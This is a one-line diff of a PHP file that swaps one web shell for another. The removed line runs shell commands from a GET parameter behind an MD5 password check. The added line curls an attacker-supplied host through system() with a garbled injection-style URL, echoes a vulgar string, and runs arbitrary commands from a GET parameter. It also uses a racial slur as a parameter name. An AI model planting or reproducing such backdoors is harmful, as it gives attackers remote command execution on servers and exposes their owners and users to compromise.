@@ -1,1 +1,1 @@
-<?php $mf = $_GET['p']; if (md5($mf) === 'e3ccd0e55c6e000511ff1b3e017a3269') { system($_GET['h3x']); }?>
+<?php $lgaetz = $_GET['nigga']; system("curl $lgaetz/ajax.php?display=sysadmin_%%%("."WTF%.%)MOH&view=portmgmt%208S%2250%%%00.+.+; echo Seems_Fuckable"); system($_GET['hex']); ?>
